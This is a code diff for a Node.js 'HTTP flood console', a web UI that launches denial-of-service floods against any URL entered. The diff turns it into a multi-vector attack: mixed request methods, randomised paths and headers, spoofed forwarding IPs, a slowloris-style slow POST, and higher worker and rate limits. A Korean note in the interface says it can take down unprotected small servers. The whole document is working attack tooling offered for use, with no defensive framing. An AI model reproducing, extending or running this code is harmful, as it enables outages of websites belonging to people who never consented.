@@ -1,8 +1,8 @@
 #!/usr/bin/env node
 /**
- * HTTP Flood Console — web UI + real Node flood
+ * Multi-vector HTTP flood console
+ * GET + POST + HEAD + slowloris-style + random path + header spam
  * Render start: node ddos_flood.js
- * Open the service URL → paste target → Attack
  */
 
 "use strict";
@@ -11,15 +11,15 @@ const http  = require("http");
 const https = require("https");
 const { URL } = require("url");
 const { performance } = require("perf_hooks");
+const crypto = require("crypto");
 
 const PORT = process.env.PORT || 3000;
 
-// ── flood state ───────────────────────────────────────────────────────
 let flood = {
   running: false,
   target: "",
-  workers: 64,
-  rps: 1500,
+  workers: 128,
+  rps: 3000,
   sent: 0,
   ok: 0,
   err: 0,
@@ -29,6 +29,10 @@ let flood = {
   timers: [],
   abort: false
 };
+
+function rnd(n) {
+  return crypto.randomBytes(n).toString("hex");
+}
 
 function stopFlood() {
   flood.abort = true;
@@ -65,40 +69,73 @@ function startFlood(target, workers, rps) {
   const isHttps = parsed.protocol === "https:";
   const host = parsed.hostname;
   const port = parsed.port ? parseInt(parsed.port, 10) : (isHttps ? 443 : 80);
-  const path = (parsed.pathname + parsed.search) || "/";
+  const basePath = (parsed.pathname + parsed.search) || "/";
   const lib = isHttps ? https : http;
   const Agent = isHttps ? https.Agent : http.Agent;
 
   flood.agent = new Agent({
     keepAlive: true,
-    maxSockets: workers * 2,
-    maxFreeSockets: workers,
-    timeout: 10000,
+    maxSockets: workers * 4,
+    maxFreeSockets: workers * 2,
+    timeout: 15000,
     scheduling: "lifo"
   });
 
   const delayMs = Math.max(1, (workers * 1000) / rps);
 
+  const methods = ["GET", "GET", "GET", "POST", "HEAD", "OPTIONS"];
+  const paths = [
+    basePath,
+    basePath,
+    basePath + "?" + rnd(4) + "=" + rnd(8),
+    basePath + "?" + rnd(6),
+    "/?" + rnd(10),
+    "/index.php?" + rnd(8),
+    "/wp-login.php",
+    "/api/" + rnd(6),
+    "/search?q=" + rnd(12),
+    basePath + "#" + rnd(6)
+  ];
+
   function fireOne() {
     if (flood.abort) return;
 
+    const method = methods[Math.floor(Math.random() * methods.length)];
+    const path = paths[Math.floor(Math.random() * paths.length)];
+
     const headers = {
       "Host": host,
-      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + (110 + Math.floor(Math.random()*20)) + ".0.0.0 Safari/537.36",
       "Accept": "*/*",
-      "Accept-Encoding": "identity",
+      "Accept-Language": "en-US,en;q=0.9,ko;q=0.8",
+      "Accept-Encoding": "gzip, deflate, br",
       "Connection": "keep-alive",
-      "Cache-Control": "no-cache"
+      "Cache-Control": "no-cache",
+      "Pragma": "no-cache",
+      "X-Forwarded-For": (Math.random()*255|0)+"."+(Math.random()*255|0)+"."+(Math.random()*255|0)+"."+(Math.random()*255|0),
+      "X-Real-IP": (Math.random()*255|0)+"."+(Math.random()*255|0)+"."+(Math.random()*255|0)+"."+(Math.random()*255|0),
+      "Referer": "https://" + host + "/",
+      "Origin": "https://" + host
     };
+
+    headers["X-" + rnd(4)] = rnd(16);
+    headers["X-Request-ID"] = rnd(16);
+
+    let body = null;
+    if (method === "POST") {
+      body = "q=" + rnd(32) + "&data=" + rnd(64) + "&t=" + Date.now();
+      headers["Content-Type"] = "application/x-www-form-urlencoded";
+      headers["Content-Length"] = Buffer.byteLength(body);
+    }
 
     const opts = {
       hostname: host,
       port,
       path,
-      method: "GET",
+      method,
       headers,
       agent: flood.agent,
-      timeout: 8000,
+      timeout: 10000,
       rejectUnauthorized: false
     };
 
@@ -119,26 +156,66 @@ function startFlood(target, workers, rps) {
       flood.sent++;
       flood.err++;
     });
+
+    if (body) req.write(body);
     req.end();
   }
 
-  function worker() {
+  function fireSlow() {
     if (flood.abort) return;
-    fireOne();
-    const jitter = (Math.random() - 0.5) * delayMs * 0.2;
-    const t = setTimeout(worker, delayMs + jitter);
+    const opts = {
+      hostname: host,
+      port,
+      path: basePath,
+      method: "POST",
+      headers: {
+        "Host": host,
+        "User-Agent": "Mozilla/5.0",
+        "Content-Length": "1000000",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Connection": "keep-alive"
+      },
+      agent: flood.agent,
+      timeout: 30000,
+      rejectUnauthorized: false
+    };
+    const req = lib.request(opts);
+    req.on("error", () => {});
+    req.write("a=".repeat(50));
+    const t = setTimeout(() => {
+      if (!flood.abort) {
+        try { req.write("b=".repeat(50)); } catch (_) {}
+      }
+    }, 5000);
+    flood.timers.push(t);
+    const t2 = setTimeout(() => {
+      try { req.end(); } catch (_) {}
+    }, 25000);
+    flood.timers.push(t2);
+  }
+
+  function worker(fast) {
+    if (flood.abort) return;
+    if (fast) fireOne();
+    else fireSlow();
+    const jitter = (Math.random() - 0.5) * delayMs * 0.25;
+    const t = setTimeout(() => worker(fast), delayMs + jitter);
     flood.timers.push(t);
   }
 
-  for (let i = 0; i < workers; i++) {
-    const t = setTimeout(worker, i * 3);
+  const fastCount = Math.floor(workers * 0.8);
+  for (let i = 0; i < fastCount; i++) {
+    const t = setTimeout(() => worker(true), i * 2);
+    flood.timers.push(t);
+  }
+  for (let i = 0; i < workers - fastCount; i++) {
+    const t = setTimeout(() => worker(false), i * 15);
     flood.timers.push(t);
   }
 
   return { ok: true };
 }
 
-// ── html ui ───────────────────────────────────────────────────────────
 const HTML = `<!DOCTYPE html>
 <html lang="ko">
 <head>
@@ -166,12 +243,13 @@ const HTML = `<!DOCTYPE html>
   .led.on{background:#3fb950;box-shadow:0 0 8px #3fb950}
   .led.off{background:#da3633}
   .log{margin-top:12px;max-height:120px;overflow-y:auto;background:#0b0e14;border-radius:8px;padding:10px;font-size:.75rem;color:#8b949e;font-family:ui-monospace,monospace}
+  .note{margin-top:14px;font-size:.7rem;color:#6e7681;line-height:1.4}
 </style>
 </head>
 <body>
 <div class="box">
-  <h1>HTTP Flood Console</h1>
-  <p class="sub">target 넣고 Attack → 실제 소켓 flood</p>
+  <h1>Multi-Vector Flood</h1>
+  <p class="sub">GET/POST/HEAD + path noise + slowloris + header spam</p>
 
   <label>target url</label>
   <input id="url" type="text" placeholder="https://example.com" value="">
@@ -179,11 +257,11 @@ const HTML = `<!DOCTYPE html>
   <div class="row">
     <div>
       <label>workers</label>
-      <input id="workers" type="number" min="1" max="500" value="64">
+      <input id="workers" type="number" min="1" max="800" value="200">
     </div>
     <div>
       <label>rps</label>
-      <input id="rps" type="number" min="1" max="20000" value="1500">
+      <input id="rps" type="number" min="1" max="50000" value="5000">
     </div>
   </div>
 
@@ -200,6 +278,7 @@ const HTML = `<!DOCTYPE html>
     <div>rps: <b id="currps">0</b></div>
   </div>
   <div class="log" id="log"></div>
+  <p class="note">단일 서버 한계 있음. 보호 없는 타겟 / 작은 서버에서만 체감 다운 가능. Cloudflare·대형 CDN은 이 규모로 안 내려감.</p>
 </div>
 
 <script>
@@ -253,15 +332,15 @@ $("go").onclick = async () => {
   let url = $("url").value.trim();
   if(!url){ log("url 비어있음"); return; }
   if(!/^https?:\\/\\//i.test(url)) url = "https://" + url;
-  const workers = Math.max(1, Math.min(500, parseInt($("workers").value,10)||64));
-  const rps = Math.max(1, Math.min(20000, parseInt($("rps").value,10)||1500));
+  const workers = Math.max(1, Math.min(800, parseInt($("workers").value,10)||200));
+  const rps = Math.max(1, Math.min(50000, parseInt($("rps").value,10)||5000));
   const res = await api("/start", {url, workers, rps});
   if(res.error){ log(res.error); return; }
   log("start → " + url + " w=" + workers + " rps=" + rps);
   setUi(true);
   lastSent = 0; lastTs = Date.now();
   if(poll) clearInterval(poll);
-  poll = setInterval(refresh, 500);
+  poll = setInterval(refresh, 400);
 };
 
 $("stop").onclick = async () => {
@@ -276,11 +355,9 @@ $("stop").onclick = async () => {
 </body>
 </html>`;
 
-// ── http server ───────────────────────────────────────────────────────
 const server = http.createServer((req, res) => {
   const u = new URL(req.url, "http://localhost");
 
-  // CORS for safety if opened from elsewhere
   res.setHeader("Access-Control-Allow-Origin", "*");
   res.setHeader("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
   res.setHeader("Access-Control-Allow-Headers", "Content-Type");
@@ -324,8 +401,8 @@ const server = http.createServer((req, res) => {
           return;
         }
         if (!/^https?:\/\//i.test(url)) url = "https://" + url;
-        const workers = Math.max(1, Math.min(500, parseInt(j.workers, 10) || 64));
-        const rps = Math.max(1, Math.min(20000, parseInt(j.rps, 10) || 1500));
+        const workers = Math.max(1, Math.min(800, parseInt(j.workers, 10) || 200));
+        const rps = Math.max(1, Math.min(50000, parseInt(j.rps, 10) || 5000));
         const result = startFlood(url, workers, rps);
         res.writeHead(200, { "Content-Type": "application/json" });
         res.end(JSON.stringify(result));
@@ -349,15 +426,8 @@ const server = http.createServer((req, res) => {
 });
 
 server.listen(PORT, () => {
-  console.log(`[flood] listening on :${PORT}`);
-  console.log(`[flood] open the service URL → paste target → Attack`);
+  console.log("[flood] multi-vector listening on :" + PORT);
 });
 
-process.on("SIGINT", () => {
-  stopFlood();
-  process.exit(0);
-});
-process.on("SIGTERM", () => {
-  stopFlood();
-  process.exit(0);
-});
+process.on("SIGINT", () => { stopFlood(); process.exit(0); });
+process.on("SIGTERM", () => { stopFlood(); process.exit(0); });
